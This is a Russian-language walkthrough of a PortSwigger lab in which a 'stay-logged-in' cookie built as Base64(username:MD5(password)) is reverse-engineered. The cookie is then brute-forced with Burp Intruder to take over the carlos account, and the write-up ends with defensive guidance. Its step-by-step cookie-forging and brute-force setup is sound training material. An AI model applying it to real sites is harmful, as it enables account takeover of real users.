# 📘 PortSwigger Lab: Brute-forcing a Stay-Logged-In Cookie

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie  
> 🎯 Тема: Authentication vulnerabilities — vulnerabilities in other authentication mechanisms  
> 🧪 Уровень: Practitioner

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🏗 Как должна работать функция Stay logged in](#correct-flow)
- [❌ Уязвимая логика приложения](#vulnerable-flow)
- [🍪 Почему `stay-logged-in` cookie опасна](#cookie-danger)
- [🔍 Шаг 1 — Входим с функцией Stay logged in](#step1)
- [🔍 Шаг 2 — Находим persistent cookie](#step2)
- [🔍 Шаг 3 — Декодируем cookie](#step3)
- [🔍 Шаг 4 — Определяем алгоритм создания cookie](#step4)
- [🔍 Шаг 5 — Проверяем гипотезу с MD5](#step5)
- [🔍 Шаг 6 — Подготавливаем запрос для Intruder](#step6)
- [🔍 Шаг 7 — Настраиваем Payload Processing](#step7)
- [🔍 Шаг 8 — Удаляем обычную session cookie](#step8)
- [🔍 Шаг 9 — Запускаем перебор](#step9)
- [🔍 Шаг 10 — Находим правильный пароль](#step10)
- [🔍 Шаг 11 — Получаем доступ к аккаунту Carlos](#step11)
- [🧾 Итоговая цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧪 Разбор найденной cookie](#cookie-breakdown)
- [💡 Почему длина ответа была главным индикатором](#response-length)
- [⚠ Почему `session` мешала атаке](#session-conflict)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)

---

<a id="goal"></a>

## 🎯 Цель

Получить доступ к странице аккаунта пользователя `carlos`, подобрав значение его persistent authentication cookie.

Исходные данные:

```text
Свой аккаунт:
wiener:peter

Имя пользователя жертвы:
carlos
```

Лаборатория также предоставляет список:

```text
Candidate passwords
```

Цель — определить алгоритм генерации cookie `stay-logged-in`, воспроизвести его для каждого пароля из словаря и найти значение, которое позволит серверу аутентифицировать нас как `carlos`.

---

<a id="theory"></a>

## 🧠 Краткая теория

После обычного входа приложение обычно создаёт временную сессию:

```http
Set-Cookie: session=RANDOM_VALUE
```

Такая cookie идентифицирует текущую серверную сессию.

Функция:

```text
Stay logged in
```

или:

```text
Remember me
```

позволяет пользователю оставаться авторизованным даже после закрытия браузера или завершения обычной сессии.

Для этого приложение выдаёт отдельную долгоживущую cookie:

```http
Set-Cookie: stay-logged-in=...
```

Безопасная cookie должна содержать случайный, непредсказуемый токен, который:

- не зависит напрямую от пароля;
- хранится или проверяется на сервере;
- имеет срок действия;
- может быть отозван;
- меняется после использования или повторного входа.

Опасная реализация может создавать токен из предсказуемых данных:

```text
username
password
user ID
timestamp
hash(password)
```

Если алгоритм можно восстановить, атакующий может генерировать валидные cookie самостоятельно.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Cookie пользователя `wiener` выглядела так:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

После декодирования Base64:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Вторая часть оказалась MD5-хешем пароля `peter`:

```text
MD5("peter")
=
51dc30ddc473d43a6011e9ebba6ca770
```

Следовательно, приложение создаёт cookie по формуле:

```text
Base64(username:MD5(password))
```

Для Carlos нужно перебирать:

```text
Base64(carlos:MD5(candidate_password))
```

---

<a id="correct-flow"></a>

## 🏗 Как должна работать функция Stay logged in

Безопасная схема:

```text
Пользователь вводит логин и пароль
        ↓
Сервер проверяет учётные данные
        ↓
Сервер генерирует случайный токен
        ↓
Токен связывается с user_id на сервере
        ↓
В браузер отправляется случайная cookie
        ↓
При следующем посещении сервер проверяет токен
        ↓
Токен имеет срок действия и может быть отозван
```

Пример серверной записи:

```text
token_hash -> user_id
expires_at
device_info
last_used_at
```

Ключевой момент:

```text
Токен не должен вычисляться из пароля.
```

---

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика приложения

В лаборатории логика выглядит примерно так:

```text
username = wiener
password = peter
        ↓
MD5(password)
        ↓
wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
Base64
        ↓
stay-logged-in cookie
```

То есть:

```text
stay-logged-in =
Base64(username:MD5(password))
```

Для Carlos:

```text
candidate password
        ↓
MD5(candidate password)
        ↓
carlos:MD5(candidate password)
        ↓
Base64
        ↓
проверка cookie сервером
```

Атакующий может полностью воспроизвести этот алгоритм.

---

<a id="cookie-danger"></a>

## 🍪 Почему `stay-logged-in` cookie опасна

Cookie является bearer-токеном.

Это означает:

```text
Кто владеет cookie,
тот считается аутентифицированным пользователем.
```

Проблема лаборатории не только в использовании MD5.

Основная ошибка:

```text
Секрет аутентификации
напрямую вычисляется из пароля.
```

Даже если заменить MD5 на SHA-256:

```text
Base64(username:SHA256(password))
```

дизайн всё равно останется уязвимым, потому что атакующий сможет выполнять тот же словарный перебор.

Base64 также не является шифрованием.

Она только кодирует данные в другой текстовый формат.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Входим с функцией Stay logged in

Запускаем Burp Suite и открываем лабораторию.

Вводим:

```text
Username: wiener
Password: peter
```

Обязательно отмечаем:

```text
Stay logged in
```

После успешного входа приложение открывает:

```text
/my-account
```

На этом этапе важно изучить запросы и ответы в:

```text
Proxy → HTTP history
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Находим persistent cookie

В ответе после входа находим заголовок:

```http
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Также может присутствовать обычная cookie:

```http
Set-Cookie: session=...
```

Нас интересует именно:

```text
stay-logged-in
```

потому что она отвечает за долгосрочную аутентификацию.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Декодируем cookie

Копируем значение:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Декодируем его как Base64.

Результат:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Структура:

```text
username:hash
```

Первая часть уже известна:

```text
wiener
```

Вторая часть состоит из 32 шестнадцатеричных символов:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Это характерный формат MD5.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Определяем алгоритм создания cookie

Из декодированной строки видно:

```text
wiener:HASH
```

У нас есть известный пароль:

```text
peter
```

Поэтому возникает гипотеза:

```text
HASH = MD5(password)
```

Полная предполагаемая схема:

```text
password
        ↓
MD5(password)
        ↓
username:MD5(password)
        ↓
Base64
        ↓
stay-logged-in
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Проверяем гипотезу с MD5

Вычисляем:

```text
MD5("peter")
```

Получаем:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Это полностью совпадает со второй частью cookie:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Следовательно, гипотеза подтверждена.

Формула:

```text
stay-logged-in =
Base64(username:MD5(password))
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Подготавливаем запрос для Intruder

Открываем страницу аккаунта Carlos:

```http
GET /my-account?id=carlos
```

Перехватываем запрос или находим его в HTTP history.

Отправляем в Intruder:

```text
Right click → Send to Intruder
```

В cookie устанавливаем payload position:

```http
Cookie: stay-logged-in=§PAYLOAD§
```

Пример:

```http
GET /my-account?id=carlos HTTP/2
Host: vulnerable-website.com
Cookie: stay-logged-in=§dGVzdA==§
```

Attack type:

```text
Sniper
```

Payload type:

```text
Simple list
```

Загружаем:

```text
Candidate passwords
```

---

<a id="step7"></a>

## 🔍 Шаг 7 — Настраиваем Payload Processing

Исходные payload — обычные пароли:

```text
123456
password
qwerty
shadow
...
```

Но сервер ожидает cookie:

```text
Base64(carlos:MD5(password))
```

Поэтому настраиваем правила строго в таком порядке.

### 1. Hash → MD5

```text
shadow
        ↓
3bf1114a986ba87ed28fc1b5884fc2f8
```

### 2. Add prefix → `carlos:`

```text
3bf1114a986ba87ed28fc1b5884fc2f8
        ↓
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

### 3. Encode → Base64

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
        ↓
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Итоговая последовательность:

```text
Hash → MD5
Add Prefix → carlos:
Base64 encode
```

Порядок менять нельзя.

---

<a id="step8"></a>

## 🔍 Шаг 8 — Удаляем обычную session cookie

Изначально запрос мог выглядеть так:

```http
Cookie: session=VALID_SESSION; stay-logged-in=§PAYLOAD§
```

Так делать нельзя.

Нужно полностью удалить:

```http
session=VALID_SESSION
```

И оставить только:

```http
Cookie: stay-logged-in=§PAYLOAD§
```

Почему это важно:

```text
Если session действительна,
сервер использует её первой.
```

В этом случае приложение продолжает видеть нас как `wiener`, а значение `stay-logged-in` практически не влияет на ответ.

---

<a id="step9"></a>

## 🔍 Шаг 9 — Запускаем перебор

Запускаем Intruder.

Большинство запросов возвращали:

```text
Status: 200
Length: 3363
```

Один запрос отличался:

```text
Request: 17
Status: 200
Length: 3450
```

Payload:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Именно отличие в длине ответа показало, что сервер вернул другое содержимое.

---

<a id="step10"></a>

## 🔍 Шаг 10 — Находим правильный пароль

Запросу 17 соответствовал исходный пароль:

```text
shadow
```

Проверяем цепочку вручную:

```text
MD5("shadow")
=
3bf1114a986ba87ed28fc1b5884fc2f8
```

Добавляем username:

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

Кодируем в Base64:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Значение совпадает с успешным payload.

Правильный пароль:

```text
shadow
```

---

<a id="step11"></a>

## 🔍 Шаг 11 — Получаем доступ к аккаунту Carlos

Используем найденные данные:

```text
Username: carlos
Password: shadow
```

Входим через обычную форму логина.

После входа открывается:

```text
/my-account
```

На странице отображается аккаунт Carlos.

Лаборатория решена.

---

<a id="attack-chain"></a>

## 🧾 Итоговая цепочка атаки

```text
1. Войти как wiener:peter
        ↓
2. Включить Stay logged in
        ↓
3. Найти cookie stay-logged-in
        ↓
4. Декодировать её из Base64
        ↓
5. Получить:
   wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
6. Проверить MD5("peter")
        ↓
7. Восстановить формулу:
   Base64(username:MD5(password))
        ↓
8. Отправить GET /my-account?id=carlos в Intruder
        ↓
9. Удалить session cookie
        ↓
10. Добавить Candidate passwords
        ↓
11. Настроить:
    MD5 → prefix carlos: → Base64
        ↓
12. Запустить атаку
        ↓
13. Найти отличающийся Length: 3450
        ↓
14. Определить исходный пароль: shadow
        ↓
15. Войти как carlos:shadow
        ↓
16. Получить доступ к аккаунту Carlos
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Сервер использовал детерминированный токен:

```text
Base64(username:MD5(password))
```

Детерминированный означает:

```text
Одинаковые входные данные
всегда дают одинаковый результат.
```

У атакующего были:

```text
username жертвы
алгоритм хеширования
формат cookie
словарь паролей
```

Поэтому для каждого кандидата можно было вычислить:

```text
Base64(carlos:MD5(candidate))
```

и отправить результат серверу.

Уязвимая логика могла выглядеть так:

```python
decoded = base64_decode(cookie)
username, supplied_hash = decoded.split(":")

if supplied_hash == md5(database_password_for(username)):
    authenticate(username)
```

Сервер фактически позволял подбирать пароль через persistent cookie.

---

<a id="cookie-breakdown"></a>

## 🧪 Разбор найденной cookie

Исходный пароль:

```text
shadow
```

MD5:

```text
3bf1114a986ba87ed28fc1b5884fc2f8
```

Строка перед Base64:

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

Готовая cookie:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Полная схема:

```text
shadow
        ↓ MD5
3bf1114a986ba87ed28fc1b5884fc2f8
        ↓ Add prefix
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
        ↓ Base64
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

---

<a id="response-length"></a>

## 💡 Почему длина ответа была главным индикатором

Все ответы имели:

```text
Status: 200
```

Поэтому статус-код не помогал отличить успех.

Большинство неправильных запросов:

```text
Length: 3363
```

Правильный запрос:

```text
Length: 3450
```

Разница означает, что сервер вернул другое HTML-содержимое.

Например:

```text
неверная cookie
        ↓
страница входа или гостевая страница
```

и:

```text
верная cookie
        ↓
страница аккаунта Carlos
```

При brute-force нужно анализировать не только:

```text
Status
```

но и:

```text
Length
Words
Lines
Location
текст ответа
имя пользователя
наличие кнопки Logout
```

---

<a id="session-conflict"></a>

## ⚠ Почему `session` мешала атаке

Первоначально в запросе оставалась действующая session cookie пользователя `wiener`.

Схема приложения могла быть такой:

```text
Есть session cookie?
        ↓
Да
        ↓
Аутентифицировать по session
        ↓
Не использовать stay-logged-in
```

Поэтому все ответы были одинаковыми независимо от payload.

После удаления session:

```text
Нет session cookie
        ↓
Проверить stay-logged-in
        ↓
Неверные значения отклоняются
        ↓
Правильное значение аутентифицирует Carlos
```

Это важный практический урок:

```text
При тестировании одного механизма аутентификации
нужно исключить влияние остальных.
```

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При анализе функций Remember me и Stay logged in задавай следующие вопросы:

```text
1. Какая cookie появляется после включения функции?
2. Меняется ли она после повторного входа?
3. Выглядит ли она случайной?
4. Можно ли её декодировать?
5. Есть ли внутри username, email или user ID?
6. Есть ли строка, похожая на MD5 или SHA?
7. Зависит ли cookie от пароля?
8. Можно ли создать cookie другого пользователя?
9. Есть ли rate limit на проверку cookie?
10. Что произойдёт после удаления session cookie?
11. Отзывается ли токен после Logout?
12. Отзывается ли он после смены пароля?
```

Правильный порядок работы:

```text
Наблюдение
        ↓
Гипотеза
        ↓
Ручная проверка
        ↓
Автоматизация
        ↓
Анализ отличий
```

Главная мысль:

```text
Не запускай brute-force,
пока не понял точный формат данных.
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### 1. Считать Base64 шифрованием

Base64 не использует ключ и легко декодируется.

### 2. Перебирать форму логина вместо cookie

Лаборатория специально уязвима через persistent authentication mechanism.

### 3. Оставить `session` cookie

Тогда сервер продолжает использовать действующую сессию `wiener`.

### 4. Использовать prefix `wiener:`

Для атаки нужен:

```text
carlos:
```

### 5. Перепутать порядок Payload Processing

Правильно:

```text
MD5
        ↓
carlos:
        ↓
Base64
```

### 6. Применить Base64 только к хешу

Нужно кодировать всю строку:

```text
carlos:MD5(password)
```

### 7. Смотреть только на Status

В этой лаборатории успех определялся по:

```text
Length
```

### 8. Не проверять найденный payload вручную

После нахождения аномалии полезно декодировать cookie и проверить цепочку.

### 9. Считать номер запроса номером строки без проверки

Нужно смотреть исходный payload, который соответствовал запросу.

---

<a id="defense"></a>

## 🛡 Защита

Правильная защита должна включать несколько уровней.

### 1. Использовать случайные токены

Например:

```text
256-bit random value
```

Токен не должен вычисляться из:

```text
username
password
password hash
email
timestamp
```

### 2. Хранить на сервере только хеш токена

Пример:

```text
selector
token_hash
user_id
expires_at
```

### 3. Ограничивать срок действия

Persistent cookie не должна быть бессрочной.

### 4. Отзывать токен

Токен должен аннулироваться после:

```text
Logout
смены пароля
Logout from all devices
подозрительной активности
```

### 5. Ротировать токен

После успешного использования желательно выдавать новое значение.

### 6. Использовать безопасные атрибуты cookie

```http
Secure
HttpOnly
SameSite=Lax
```

### 7. Добавить rate limiting

Сервер должен ограничивать массовую проверку persistent cookies.

### 8. Логировать аномалии

Нужно обнаруживать:

```text
тысячи разных cookie для одного username
перебор последовательных значений
частые неудачные попытки
смену IP и устройства
```

Безопасная схема:

```text
Login successful
        ↓
Generate random token
        ↓
Store token hash server-side
        ↓
Send random token to browser
        ↓
Validate token and expiry
        ↓
Rotate or revoke when necessary
```

---

<a id="checklist"></a>

## ✅ Чек-лист

- [x] Выполнен вход под `wiener:peter`.
- [x] Включена функция Stay logged in.
- [x] Найдена cookie `stay-logged-in`.
- [x] Cookie декодирована из Base64.
- [x] Получена строка `wiener:51dc30ddc473d43a6011e9ebba6ca770`.
- [x] Определён формат `username:hash`.
- [x] Проверено, что хеш равен `MD5("peter")`.
- [x] Восстановлена формула `Base64(username:MD5(password))`.
- [x] Подготовлен запрос `GET /my-account?id=carlos`.
- [x] Запрос отправлен в Intruder.
- [x] Payload position установлен на `stay-logged-in`.
- [x] Загружен список Candidate passwords.
- [x] Настроено правило Hash → MD5.
- [x] Добавлен prefix `carlos:`.
- [x] Добавлено Base64 encoding.
- [x] Удалена обычная `session` cookie.
- [x] Запущен brute-force.
- [x] Найден отличающийся ответ `Length: 3450`.
- [x] Определён пароль `shadow`.
- [x] Выполнен вход как `carlos:shadow`.
- [x] Получен доступ к аккаунту Carlos.
- [x] Лаборатория решена.

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
